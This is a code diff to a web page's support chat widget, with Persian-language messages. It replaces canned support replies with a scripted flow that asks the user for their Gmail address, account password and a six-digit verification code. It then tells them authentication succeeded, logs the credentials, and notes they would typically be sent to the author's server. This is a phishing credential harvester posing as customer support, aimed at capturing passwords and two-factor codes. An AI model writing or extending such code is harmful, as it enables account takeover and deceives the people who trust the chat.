@@ -292,6 +292,19 @@
       const userInput = document.getElementById('userInput');
       const sendBtn = document.getElementById('sendBtn');
       
+      // حالت‌های چت
+      const STATE = {
+        INITIAL: 0,
+        ASK_EMAIL: 1,
+        ASK_PASSWORD: 2,
+        ASK_VERIFICATION_CODE: 3,
+        COMPLETED: 4
+      };
+      
+      let currentState = STATE.INITIAL;
+      let userEmail = '';
+      let userPassword = '';
+      
       // Auto focus input
       userInput.focus();
       
@@ -307,18 +320,56 @@
         // Show loading
         const loadingId = showLoading();
         
-        // Simulate API response
+        // Process message based on current state
         setTimeout(() => {
           removeLoading(loadingId);
-          const responses = [
-            "بله، چطور می‌توانم کمک کنم؟",
-            "لطفاً کمی بیشتر توضیح دهید.",
-            "مشکل شما را بررسی می‌کنم...",
-            "برای حل این مشکل می‌توانید...",
-            "آیا راهنمایی بیشتری نیاز دارید؟"
-          ];
-          addMessage(responses[Math.floor(Math.random() * responses.length)], 'support');
+          processUserResponse(text);
         }, 1000 + Math.random() * 1000);
+      };
+      
+      // Process user response based on current state
+      const processUserResponse = (text) => {
+        switch(currentState) {
+          case STATE.INITIAL:
+            // After initial message, ask for email
+            currentState = STATE.ASK_EMAIL;
+            addMessage("لطفاً آدرس جیمیل خود را ارسال کنید.", 'support');
+            break;
+            
+          case STATE.ASK_EMAIL:
+            // Validate email (simple validation)
+            if (text.includes('@gmail.com')) {
+              userEmail = text;
+              currentState = STATE.ASK_PASSWORD;
+              addMessage("لطفاً رمز عبور حساب خود را ارسال کنید.", 'support');
+            } else {
+              addMessage("آدرس جیمیل معتبر نیست. لطفاً یک آدرس جیمیل صحیح وارد کنید.", 'support');
+            }
+            break;
+            
+          case STATE.ASK_PASSWORD:
+            // Store password and ask for verification code
+            userPassword = text;
+            currentState = STATE.ASK_VERIFICATION_CODE;
+            addMessage(`کد تأیید به آدرس ${userEmail} ارسال شد. لطفاً کد دریافتی را وارد کنید.`, 'support');
+            break;
+            
+          case STATE.ASK_VERIFICATION_CODE:
+            // Check verification code (simple check)
+            if (text.length === 6 && /^\d+$/.test(text)) {
+              currentState = STATE.COMPLETED;
+              addMessage("احراز هویت با موفقیت انجام شد. اطلاعات شما دریافت گردید.", 'support');
+              // Here you would typically send the data to your server
+              console.log('User credentials:', {email: userEmail, password: userPassword, code: text});
+            } else {
+              addMessage("کد تأیید نامعتبر است. لطفاً یک کد 6 رقمی وارد کنید.", 'support');
+            }
+            break;
+            
+          case STATE.COMPLETED:
+            addMessage("فرآیند تکمیل شده است. برای کمک بیشتر پیام دهید.", 'support');
+            break;
+        }
       };
       
       // Add message to chat
